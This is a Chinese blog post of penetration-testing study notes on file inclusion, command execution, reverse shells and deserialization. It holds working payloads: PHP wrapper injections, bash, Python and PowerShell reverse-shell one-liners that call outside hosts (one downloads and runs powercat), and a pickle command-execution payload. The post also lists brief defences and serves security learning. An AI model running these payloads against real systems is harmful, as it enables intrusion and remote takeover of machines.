<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="yes" name="apple-touch-fullscreen"><meta content="telephone=no,email=no" name="format-detection"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"><link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon"><link href="https://fonts.googleapis.com/css?family=Rubik" rel="stylesheet"><script src="https://use.fontawesome.com/adaf0e149c.js"></script><link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.6.0/styles/monokai_sublime.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="/css/post.css"><link rel="stylesheet" href="/css/markdown-github.css"><title>zhang's blog</title><script src="/js/googleAnalytics.js"></script></head><body><div id="postContainer"><div id="postTop"><h4 id="logo">Life Is Short</h4><br><br><h2 id="postTitle">文件包含和命令执行</h2><br><span aria-hidden="true" class="postTime fa fa-calendar">2019-1-20</span><br><br></div><section id="articleDiv"><p></p><p>前言:文件包含漏洞和命令执行漏洞虽然很难在黑盒测试下发现，但其危害还是很大的。</p><p></p>
<p></p><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><p>php:include(),include_once(), require(),require_once(), fopen(),readfile()</p><p></p>
<p></p><p>jsp: java.io.File(), java.io.FileReader()</p><p></p>
<p></p><p>asp: include file, include virtual</p><p></p>
<p></p><h3 id="文件包含漏洞危害"><a href="#文件包含漏洞危害" class="headerlink" title="文件包含漏洞危害"></a>文件包含漏洞危害</h3><h4 id="1-敏感信息泄露"><a href="#1-敏感信息泄露" class="headerlink" title="1.敏感信息泄露"></a>1.敏感信息泄露</h4><h4 id="2-获取webshell"><a href="#2-获取webshell" class="headerlink" title="2.获取webshell"></a>2.获取webshell</h4><h4 id="3-任意命令执行"><a href="#3-任意命令执行" class="headerlink" title="3.任意命令执行"></a>3.任意命令执行</h4><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>../../../../读取目录文件</p><p></p>
<p></p><p>限制方法：php.ini中open_basedir=www目录：限制只能打开指定路径的文件</p><p></p>
<p></p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>限制条件：php.ini文件中allow_url_include=on</p><p></p>
<p></p><h3 id="常用伪协议的使用"><a href="#常用伪协议的使用" class="headerlink" title="常用伪协议的使用"></a>常用伪协议的使用</h3><p>file://   http://   ftp://   php://   data://</p><p></p>
<p></p><p>include $_GET[]能用所有伪协议</p><p></p>
<h4 id="1-file-的使用"><a href="#1-file-的使用" class="headerlink" title="1.file://的使用"></a>1.file://的使用</h4><p>allow_url_fopen  on/off   allow_url_include on/off</p><br><p><a href="http://www.xxx.com?file=file://c:/windows/1.txt(读脚本文件)" target="_blank" rel="noopener">www.xxx.com?file=file://c:/windows/1.txt(读脚本文件)</a></p><br><h4 id="2-php-的使用"><a href="#2-php-的使用" class="headerlink" title="2.php://的使用"></a>2.php://的使用</h4><p>php://filter</p><br><p>allow_url_fopen  on/off   allow_url_include on/off</p><br><p>php://filter/read/convert.base64-encode/resource=路径+文件名(读脚本文件)</p><br><p>php://input</p><br><p>allow_url_include  on    allow_url_fopen  on/off</p><br><p><a href="http://www.xxx.com?file=php://input" target="_blank" rel="noopener">www.xxx.com?file=php://input</a>&lt;?php phpinfo();?&gt;(写文件)</p><br><h4 id="3-data"><a href="#3-data" class="headerlink" title="3.data://"></a>3.data://</h4><p>allow_url_fopen  on   allow_url_include on</p><br><p><a href="http://www.xxx.com/?file=data://text/plain" target="_blank" rel="noopener">www.xxx.com/?file=data://text/plain</a>,&lt;?php phpinfo();?&gt;</p><br><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><h4 id="1-设置白名单"><a href="#1-设置白名单" class="headerlink" title="1.设置白名单"></a>1.设置白名单</h4><h4 id="2-过滤危险字符"><a href="#2-过滤危险字符" class="headerlink" title="2.过滤危险字符"></a>2.过滤危险字符</h4><h4 id="3-设置文件目录"><a href="#3-设置文件目录" class="headerlink" title="3.设置文件目录"></a>3.设置文件目录</h4><h4 id="4-关闭危险配置"><a href="#4-关闭危险配置" class="headerlink" title="4.关闭危险配置"></a>4.关闭危险配置</h4><h4 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h4><p>/var/log/httpd/access_log(需要权限)</p><br><p>/var/www/logs/access_log</p><br><p>/var/log/access_log</p><br><h4 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h4><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>php:eval,assert,preg_replace</p><br><p>asp:eval,exevute</p><br><p>jsp:可以使用反射机制</p><br><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>php:system,exec,shell_exec,popen,</p><br><p>asp:exec,shell_exec</p><br><p>jsp:runtime,getruntime().exec()</p><br><p>windows：&amp;,&amp;&amp;,||,|</p><br><p>linux：&amp;,&amp;&amp;,||,|,; (反引号在linux中可以执行)</p><br><h3 id="shell反弹"><a href="#shell反弹" class="headerlink" title="shell反弹"></a>shell反弹</h3><h4 id="linux下shell反弹"><a href="#linux下shell反弹" class="headerlink" title="linux下shell反弹"></a>linux下shell反弹</h4><p>攻击者:nc -lvp 6666</p><br><p>bash</p><br><p>‘’’/bin/bash -i &gt;&amp; /dev/tcp/207.148.89.116/6666 0&gt;&amp;1’’’</p><br><p>python</p><br><p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p><br><p>更多linux shell详见<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p><br><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p>攻击者:nc -lvp 6666</p><br><p>反弹cmd shell</p><br><p>powershell IEX (New-Object System.Net.Webclient).DownloadString(‘<a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)" target="_blank" rel="noopener">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)</a>;<br>powercat -c 192.168.159.134 -p 6666 -e cmd</p><br><p>更多powershell详见<a href="https://www.anquanke.com/post/id/99793" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99793</a></p><br><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h4><p>函数 serialize()  unserialize()</p><br><p>序列化serialize($a)</p><br><p>反序列化</p><br><p>类的三个函数:</p><br><p>function <strong>construct（）–&gt;构造函数时执行</strong></p><br><p>function destrunt()–&gt;析构时执行</p><br><p>function__wakeup()–&gt;反序列化时执行</p><br><p>反序列化函数-&gt;class-&gt;wakeup()\tostring()</p><br><p>php反序列化时函数定义的变量会消失</p><br><h4 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h4><p>序列化：pickle.dumps、反序列化：pickle.loads</p><br><p>固定payload,进行命令执行</p><br><p>import os<br>class abc(project):<br>    def <strong>reduce</strong>(self):<br>        return (os.system,(‘whoami’,))</p><br><h4 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h4></section></div><script src="/js/jquery.min.js"></script><script src="/js/highlight.min.js"></script><script src="/js/start.js"></script></body></html>